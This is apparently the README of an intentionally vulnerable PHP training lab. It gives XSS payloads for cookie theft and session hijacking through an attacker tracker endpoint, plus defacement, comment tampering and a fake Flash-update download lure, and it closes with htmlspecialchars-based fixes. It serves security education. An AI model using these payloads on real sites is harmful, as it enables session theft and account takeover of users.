# Vulnerable Web Application Lab (Gadget Store)

This repository contains a PHP application intentionally designed with security vulnerabilities for educational purposes. It demonstrates common web-based attacks including Data Theft, Session Hijacking, Defacement, Reputation Damage, and Malware Distribution.

## Lab Setup
1.  Run the PHP server: `php -S localhost:8000`
2.  Open `http://localhost:8000` in your browser.

### Credentials
- **Admin**: `admin` / `admin123`
- **User**: `victim` / `password123`

## Attacker Dashboard

To view the stolen data, navigate to the attacker's dashboard:
[http://localhost:8000/attacker/](http://localhost:8000/attacker/)

### Understanding the Logs
The "Data Type" column categorizes the stolen information:
- **c**: A base64-encoded browser **c**ookie.
- **sid**: A raw **s**ession **ID** string.

---

## Attack Scenarios and Payloads

### 1. Data Theft
**Objective**: Steal and decode a user's session cookie.
- **Where to inject**: Product review in `product.php`.
- **Payload**:
  ```html
  <script>fetch('http://localhost:8000/attacker/tracker.php?c=' + btoa(document.cookie));</script>
  ```

### 2. Session Hijacking
**Objective**: Steal a session ID to impersonate a user.
- **Where to inject**: Search query in `search.php`.
- **Payload**:
  ```html
  <script>new Image().src="http://localhost:8000/attacker/tracker.php?sid=" + document.cookie;</script>
  ```
- **How to Execute**:
  1. Inject the payload into a vulnerable field (like the search bar).
  2. Visit the attacker dashboard to view the stolen `PHPSESSID` cookie.
  3. Open a new browser or private window and navigate to `http://localhost:8000`.
  4. Use browser developer tools to manually set the `PHPSESSID` cookie to the value you stole.
  5. Refresh the page. You will now be logged in as the victim.

### 3. Defacement
**Objective**: Visually alter the website.
- **Where to inject**: Product review in `product.php`.
- **Payload**:
  ```html
  <script>document.body.innerHTML = '<h1 style="color:red;font-size:5rem;text-align:center;">SITE DEFACED</h1>';</script>
  ```

### 4. Reputation Damage
**Objective**: Modify a user's comment to something they didn't write.
- **Where to inject**: Product review in `product.php`.
- **Payload**:
  ```html
  <script>document.querySelector('.comment-text').innerText = 'This is a terrible product!';</script>
  ```

### 5. Malware Distribution
**Objective**: Trick a user into downloading a fake software update.
- **Where to inject**: URL parameter `promo` in `product.php`.
- **Payload**:
  ```html
  <div style="text-align:center; border:2px solid red; padding:20px;">
    <h3>Flash Player Update Required</h3>
    <p>Please install the latest version to view this content.</p>
    <a href="data:application/octet-stream;base64,SGVsbG8sIFdvcmxkIQ==" download="flash_update.exe" style="display:inline-block; background:red; color:white; padding:10px 20px; text-decoration:none; border-radius:5px;">Download Now</a>
  </div>
  ```

---

## Vulnerability Fixes

Each vulnerability can be fixed by replacing the vulnerable code with a secure alternative. The fixes are included as comments in the source files.

- **Reflected XSS (`search.php`)**
  - **File**: `search.php`
  - **Vulnerable Code**: `echo $query;`
  - **Fix**: `echo htmlspecialchars($query, ENT_QUOTES, 'UTF-8');`

- **Reflected XSS (`profile.php`)**
  - **File**: `profile.php`
  - **Vulnerable Code**: `echo $msg;`
  - **Fix**: `echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');`

- **Stored XSS (`product.php`)**
  - **File**: `product.php`
  - **Vulnerable Code**: `echo $c['comment'];`
  - **Fix**: `echo htmlspecialchars($c['comment'], ENT_QUOTES, 'UTF-8');`

- **DOM-based XSS (`product.php`)**
  - **File**: `product.php`
  - **Vulnerable Code**: `document.getElementById('promo-banner').innerHTML = ...;`
  - **Fix**: `document.getElementById('promo-banner').textContent = ...;`

---
**Disclaimer**: This application is intentionally vulnerable and should only be used in a controlled, isolated lab environment for educational purposes.
